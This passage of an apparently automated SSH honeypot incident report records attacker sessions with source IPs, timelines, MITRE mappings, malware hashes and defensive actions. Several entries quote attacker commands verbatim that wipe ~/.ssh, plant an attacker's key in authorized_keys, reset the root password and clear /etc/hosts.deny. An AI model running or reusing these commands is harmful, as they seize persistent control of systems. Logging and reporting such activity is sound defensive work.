| `2026-06-01 05:23:08` | `cowrie.session.file_download` |
| `2026-06-01 05:23:08` | `cowrie.log.closed` |
| `2026-06-01 05:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a953255a72b

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:23 |
| **Last Seen** | 2026-06-01 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:23:10` | `cowrie.session.connect` |
| `2026-06-01 05:23:10` | `cowrie.client.version` |
| `2026-06-01 05:23:10` | `cowrie.client.kex` |
| `2026-06-01 05:23:11` | `cowrie.login.success` |
| `2026-06-01 05:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fe6c72196b8

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:24 |
| **Last Seen** | 2026-06-01 05:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:24:03` | `cowrie.session.connect` |
| `2026-06-01 05:24:03` | `cowrie.client.version` |
| `2026-06-01 05:24:03` | `cowrie.client.kex` |
| `2026-06-01 05:24:03` | `cowrie.login.success` |
| `2026-06-01 05:24:04` | `cowrie.session.params` |
| `2026-06-01 05:24:04` | `cowrie.command.input` |
| `2026-06-01 05:24:04` | `cowrie.command.failed` |
| `2026-06-01 05:24:04` | `cowrie.log.closed` |
| `2026-06-01 05:24:04` | `cowrie.session.params` |
| `2026-06-01 05:24:04` | `cowrie.command.input` |
| `2026-06-01 05:24:04` | `cowrie.session.file_download` |
| `2026-06-01 05:24:04` | `cowrie.log.closed` |
| `2026-06-01 05:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6811ebd6b3a

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:24 |
| **Last Seen** | 2026-06-01 05:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:24:06` | `cowrie.session.connect` |
| `2026-06-01 05:24:06` | `cowrie.client.version` |
| `2026-06-01 05:24:06` | `cowrie.client.kex` |
| `2026-06-01 05:24:07` | `cowrie.login.success` |
| `2026-06-01 05:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a182f431fb9

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:24 |
| **Last Seen** | 2026-06-01 05:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:24:49` | `cowrie.session.connect` |
| `2026-06-01 05:24:49` | `cowrie.client.version` |
| `2026-06-01 05:24:49` | `cowrie.client.kex` |
| `2026-06-01 05:24:50` | `cowrie.login.success` |
| `2026-06-01 05:24:50` | `cowrie.session.params` |
| `2026-06-01 05:24:50` | `cowrie.command.input` |
| `2026-06-01 05:24:50` | `cowrie.command.failed` |
| `2026-06-01 05:24:50` | `cowrie.log.closed` |
| `2026-06-01 05:24:50` | `cowrie.session.params` |
| `2026-06-01 05:24:50` | `cowrie.command.input` |
| `2026-06-01 05:24:51` | `cowrie.session.file_download` |
| `2026-06-01 05:24:51` | `cowrie.log.closed` |
| `2026-06-01 05:24:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c6f20a8120

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:24 |
| **Last Seen** | 2026-06-01 05:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:24:53` | `cowrie.session.connect` |
| `2026-06-01 05:24:53` | `cowrie.client.version` |
| `2026-06-01 05:24:53` | `cowrie.client.kex` |
| `2026-06-01 05:24:53` | `cowrie.login.success` |
| `2026-06-01 05:24:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-202f266372fe

| Field | Detail |
|---|---|
| **Source IP** | `103.175.225[.]238` |
| **First Seen** | 2026-06-01 05:25 |
| **Last Seen** | 2026-06-01 05:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:25:09` | `cowrie.session.connect` |
| `2026-06-01 05:25:09` | `cowrie.client.version` |
| `2026-06-01 05:25:09` | `cowrie.client.kex` |
| `2026-06-01 05:25:10` | `cowrie.login.success` |
| `2026-06-01 05:25:10` | `cowrie.session.params` |
| `2026-06-01 05:25:10` | `cowrie.command.input` |
| `2026-06-01 05:25:10` | `cowrie.command.failed` |
| `2026-06-01 05:25:10` | `cowrie.log.closed` |
| `2026-06-01 05:25:11` | `cowrie.session.params` |
| `2026-06-01 05:25:11` | `cowrie.command.input` |
| `2026-06-01 05:25:11` | `cowrie.session.file_download` |
| `2026-06-01 05:25:11` | `cowrie.log.closed` |
| `2026-06-01 05:25:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.175.225[.]238` to AbuseIPDB if not already reported
- [ ] Block `103.175.225[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb68faac107c

| Field | Detail |
|---|---|
| **Source IP** | `103.175.225[.]238` |
| **First Seen** | 2026-06-01 05:25 |
| **Last Seen** | 2026-06-01 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:25:13` | `cowrie.session.connect` |
| `2026-06-01 05:25:13` | `cowrie.client.version` |
| `2026-06-01 05:25:13` | `cowrie.client.kex` |
| `2026-06-01 05:25:14` | `cowrie.login.success` |
| `2026-06-01 05:25:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.175.225[.]238` to AbuseIPDB if not already reported
- [ ] Block `103.175.225[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0cc4b08188

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:25 |
| **Last Seen** | 2026-06-01 05:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:25:20` | `cowrie.session.connect` |
| `2026-06-01 05:25:20` | `cowrie.client.version` |
| `2026-06-01 05:25:20` | `cowrie.client.kex` |
| `2026-06-01 05:25:21` | `cowrie.login.success` |
| `2026-06-01 05:25:21` | `cowrie.session.params` |
| `2026-06-01 05:25:21` | `cowrie.command.input` |
| `2026-06-01 05:25:21` | `cowrie.command.failed` |
| `2026-06-01 05:25:22` | `cowrie.log.closed` |
| `2026-06-01 05:25:22` | `cowrie.session.params` |
| `2026-06-01 05:25:22` | `cowrie.command.input` |
| `2026-06-01 05:25:22` | `cowrie.session.file_download` |
| `2026-06-01 05:25:22` | `cowrie.log.closed` |
| `2026-06-01 05:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e045edfeda53

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:25 |
| **Last Seen** | 2026-06-01 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:25:24` | `cowrie.session.connect` |
| `2026-06-01 05:25:24` | `cowrie.client.version` |
| `2026-06-01 05:25:24` | `cowrie.client.kex` |
| `2026-06-01 05:25:25` | `cowrie.login.success` |
| `2026-06-01 05:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd3b509b54c4

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:26 |
| **Last Seen** | 2026-06-01 05:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:26:37` | `cowrie.session.connect` |
| `2026-06-01 05:26:37` | `cowrie.client.version` |
| `2026-06-01 05:26:37` | `cowrie.client.kex` |
| `2026-06-01 05:26:38` | `cowrie.login.success` |
| `2026-06-01 05:26:38` | `cowrie.session.params` |
| `2026-06-01 05:26:38` | `cowrie.command.input` |
| `2026-06-01 05:26:38` | `cowrie.command.failed` |
| `2026-06-01 05:26:38` | `cowrie.log.closed` |
| `2026-06-01 05:26:38` | `cowrie.session.params` |
| `2026-06-01 05:26:38` | `cowrie.command.input` |
| `2026-06-01 05:26:39` | `cowrie.session.file_download` |
| `2026-06-01 05:26:39` | `cowrie.log.closed` |
| `2026-06-01 05:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f55fa6c4a4d

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:26 |
| **Last Seen** | 2026-06-01 05:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:26:41` | `cowrie.session.connect` |
| `2026-06-01 05:26:41` | `cowrie.client.version` |
| `2026-06-01 05:26:41` | `cowrie.client.kex` |
| `2026-06-01 05:26:41` | `cowrie.login.success` |
| `2026-06-01 05:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc62f467f83c

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:26 |
| **Last Seen** | 2026-06-01 05:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:26:43` | `cowrie.session.connect` |
| `2026-06-01 05:26:43` | `cowrie.client.version` |
| `2026-06-01 05:26:43` | `cowrie.client.kex` |
| `2026-06-01 05:26:43` | `cowrie.login.success` |
| `2026-06-01 05:26:44` | `cowrie.session.params` |
| `2026-06-01 05:26:44` | `cowrie.command.input` |
| `2026-06-01 05:26:44` | `cowrie.command.failed` |
| `2026-06-01 05:26:44` | `cowrie.log.closed` |
| `2026-06-01 05:26:44` | `cowrie.session.params` |
| `2026-06-01 05:26:44` | `cowrie.command.input` |
| `2026-06-01 05:26:44` | `cowrie.session.file_download` |
| `2026-06-01 05:26:44` | `cowrie.log.closed` |
| `2026-06-01 05:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec5efe9e86d5

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:26 |
| **Last Seen** | 2026-06-01 05:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:26:46` | `cowrie.session.connect` |
| `2026-06-01 05:26:46` | `cowrie.client.version` |
| `2026-06-01 05:26:47` | `cowrie.client.kex` |
| `2026-06-01 05:26:47` | `cowrie.login.success` |
| `2026-06-01 05:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-741048bcc87b

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:27 |
| **Last Seen** | 2026-06-01 05:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:27:50` | `cowrie.session.connect` |
| `2026-06-01 05:27:50` | `cowrie.client.version` |
| `2026-06-01 05:27:50` | `cowrie.client.kex` |
| `2026-06-01 05:27:51` | `cowrie.login.success` |
| `2026-06-01 05:27:51` | `cowrie.session.params` |
| `2026-06-01 05:27:51` | `cowrie.command.input` |
| `2026-06-01 05:27:51` | `cowrie.command.failed` |
| `2026-06-01 05:27:52` | `cowrie.log.closed` |
| `2026-06-01 05:27:52` | `cowrie.session.params` |
| `2026-06-01 05:27:52` | `cowrie.command.input` |
| `2026-06-01 05:27:52` | `cowrie.session.file_download` |
| `2026-06-01 05:27:52` | `cowrie.log.closed` |
| `2026-06-01 05:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53e84d57dd19

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:27 |
| **Last Seen** | 2026-06-01 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:27:54` | `cowrie.session.connect` |
| `2026-06-01 05:27:54` | `cowrie.client.version` |
| `2026-06-01 05:27:54` | `cowrie.client.kex` |
| `2026-06-01 05:27:55` | `cowrie.login.success` |
| `2026-06-01 05:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a72ed8404bcd

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-06-01 05:27 |
| **Last Seen** | 2026-06-01 05:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:zt85217NdMA2"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:27:55` | `cowrie.session.connect` |
| `2026-06-01 05:27:55` | `cowrie.client.version` |
| `2026-06-01 05:27:55` | `cowrie.client.kex` |
| `2026-06-01 05:27:56` | `cowrie.login.success` |
| `2026-06-01 05:27:57` | `cowrie.session.params` |
| `2026-06-01 05:27:57` | `cowrie.command.input` |
| `2026-06-01 05:27:57` | `cowrie.command.failed` |
| `2026-06-01 05:27:57` | `cowrie.log.closed` |
| `2026-06-01 05:27:57` | `cowrie.session.params` |
| `2026-06-01 05:27:57` | `cowrie.command.input` |
| `2026-06-01 05:27:58` | `cowrie.session.file_download` |
| `2026-06-01 05:27:58` | `cowrie.log.closed` |
| `2026-06-01 05:28:09` | `cowrie.session.params` |
| `2026-06-01 05:28:09` | `cowrie.command.input` |
| `2026-06-01 05:28:09` | `cowrie.log.closed` |
| `2026-06-01 05:28:09` | `cowrie.session.params` |
| `2026-06-01 05:28:09` | `cowrie.command.input` |
| `2026-06-01 05:28:10` | `cowrie.log.closed` |
| `2026-06-01 05:28:10` | `cowrie.session.params` |
| `2026-06-01 05:28:10` | `cowrie.command.input` |
| `2026-06-01 05:28:10` | `cowrie.session.file_download` |
| `2026-06-01 05:28:10` | `cowrie.log.closed` |
| `2026-06-01 05:28:11` | `cowrie.session.params` |
| `2026-06-01 05:28:11` | `cowrie.command.input` |
| `2026-06-01 05:28:12` | `cowrie.log.closed` |
| `2026-06-01 05:28:12` | `cowrie.session.params` |
| `2026-06-01 05:28:12` | `cowrie.command.input` |
| `2026-06-01 05:28:12` | `cowrie.log.closed` |
| `2026-06-01 05:28:13` | `cowrie.session.params` |
| `2026-06-01 05:28:13` | `cowrie.command.input` |
